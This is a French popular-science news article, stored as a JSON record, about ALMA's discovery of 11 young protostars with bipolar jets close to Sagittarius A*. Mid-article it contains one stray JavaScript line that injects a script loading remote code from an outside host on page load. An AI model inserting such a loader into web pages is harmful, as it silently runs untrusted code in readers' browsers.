{"title": "Des bebes etoiles en danger pres de notre trou noir supermassif", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-12-05", "content": "Le radiotelescope Alma a detecte de tres jeunes protoetoiles dangereusement proches de Sagittarius A*, le trou noir supermassif situe au centre de la Voie lactee. Les forces de maree de ce trou noir devraient pourtant empecher la formation de telles etoiles. Avant que les reactions de  fusion  ne debutent dans notre jeune  Soleil , celui-ci etait une protoetoile entouree d'un  disque d'accretion  d'ou s'elevaient perpendiculairement deux jets de  matiere  (voir image ci-dessous). Peu de temps avant d'arriver sur la  sequence principale , comme disent les astrophysiciens, le Soleil etait alors en phase dite << T-Tauri >>, en reference a une jeune  etoile variable  situee dans la  constellation du Taureau  et faisant partie de l'amas des  Hyades  (celle-ci a ete decouverte en 1852 par l'astronome britannique John Russell Hind). Les astronomes observent des  protoetoiles  en phase T-Tauri avec des jets de matiere depuis quelques decennies et ils commencent a bien les connaitre. Il s'agit donc d'une etape sur le chemin menant de l' effondrement  de  nuages  moleculaires poussiereux et particulierement froids dans le milieu interstellaire a des  etoiles  de quelques  masses  solaires tout au plus. Une protoetoile en formation s'entoure d'un disque de matiere (image d'artiste de gauche) sur lequel la matiere d'un coeur dense continue de tomber en effondrement gravitationnel dans un nuage moleculaire. Le disque et la chute de la matiere sur celui-ci s'expliquent par le fait qu'il existe des forces centrifuges dues a la rotation initiale du coeur. Des mecanismes complexes empechent une partie de la matiere d'atteindre la protoetoile, qui est alors ejectee par deux jets polaires. Plus tard, cette protoetoile devient une etoile avec des planetes en formation dans le disque (image d'artiste de droite). (c) Alma (ESO/NAOJ/NRAO), Yusef-Zadeh  et al. , B. Saxton (NRAO/AUI/NSF)                               11 protoetoiles qui n'auraient jamais du naitre autour de Sgr A* Tous les mysteres concernant les processus a l'oeuvre ne sont pas encore perces. Mais le moins que l'on puisse dire, c'est que les astrophysiciens ne s'attendaient tout de meme pas (en fonction de notre comprehension des mecanismes de la naissance des etoiles) a faire la decouverte, exposee dans un article recemment depose sur  arXiv , de protoetoiles proches de Sagittarius A* ( Sgr A* ), le trou noir situe au centre de notre  Galaxie .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le coeur de la  Voie lactee  se derobe largement a nos  yeux  ; celui-ci est difficilement atteignable dans le domaine du visible, que les instruments soient en  orbite  ou au sol, a cause de l'interposition de nombreux nuages riches en poussieres qui bloquent la  lumiere  a ces  longueurs d'onde . Les  rayons X ,  gamma ,  infrarouges  et dans le domaine millimetrique aussi bien que  radio  n'ont pas cette limite ; grace a eux, il est possible d'etudier les regions au coeur du bulbe de notre Galaxie. C'est pourquoi les astronomes sondent les abords du  trou noir supermassif  avec l' Atacama Large Millimeter/submillimeter Array,  plus connu sous le nom d' Alma . A sa grande surprise, une equipe de chercheurs a ainsi decouvert, avec Alma, et a des distances de quelques  annees-lumiere  seulement autour de Sagittarius A*, la presence indiscutable de 11 protoetoiles de faibles masses en phase T-Tauri, bien reconnaissables a leurs jets bipolaires. Les donnees d'Alma suggerent que ces etoiles sont particulierement jeunes : environ 6.000 ans. Une image d'Alma montrant 11 jeunes protoetoiles a environ 3 annees-lumiere de Sagittarius A* (Sgr A*), represente par une etoile. Les fleches indiquent la presence de jets bipolaires associes a ces etoiles. (c) Alma (ESO/NAOJ/NRAO), Yusef-Zadeh  et al. , B. Saxton (NRAO/AUI/NSF)                               Comment expliquer la presence de ces etoiles ? Or, si Sgr A* ne contient que 4 millions de masses solaires (ce qui est faible par rapport a ses cousins contenant plusieurs milliards de masses solaires) et qu'il n'est pas en phase de  quasar , son champ de  gravite  et les  rayonnements ultraviolets et X  qu'il emet en accretant de la matiere devraient rendre les nuages moleculaires proches de lui assez peu propices a la formation de jeunes protoetoiles. Ces nuages devraient etre trop turbulents et ces rayonnements devraient avoir tendance a souffler la matiere et a inhiber la formation stellaire, de la meme facon que le rayonnement ultraviolet de jeunes etoiles dans des pouponnieres est en mesure d'eroder serieusement les nuages dans lesquels ces etoiles se sont formees par effondrement gravitationnel. Un zoom sur une des images d'Alma montrant des jets associes a une protoetoile. (c) Alma (ESO/NAOJ/NRAO), Yusef-Zadeh  et al. , B. Saxton (NRAO/AUI/NSF)                               En fait, les  forces de maree  de Sagittarius A* devraient, par elles-memes, suffire a empecher l'effondrement des nuages moleculaires, qui sont tres loin d'etre assez denses pour que leur champ de  gravitation  contrecarre les effets de celui du trou noir supermassif, comme l'expliquent les astrophysiciens.  Une explication possible a cette enigme fait intervenir des flots de matiere pouvant etre ejectes par Sagittarius A* et qui auraient compresse suffisamment ces nuages moleculaires pour que leur densite soit a meme de provoquer leur effondrement.  Ce qu'il faut retenir Alma est un radiotelescope pouvant voir a travers les nuages poussiereux qui cachent le centre de la Voie lactee. Il peut ainsi etudier, entre autres, l'environnement du trou noir supermassif qui s'y trouve, Sagittarius A*. De jeunes protoetoiles situees a quelques annees-lumiere de ce trou noir ont ete decouvertes par Alma, ce qui intrigue les astrophysiciens. Ces astres sont dangereusement proches du trou noir. Les forces de maree de ce dernier auraient du interdire la naissance de ces jeunes etoiles. ", "theme": "sciences"}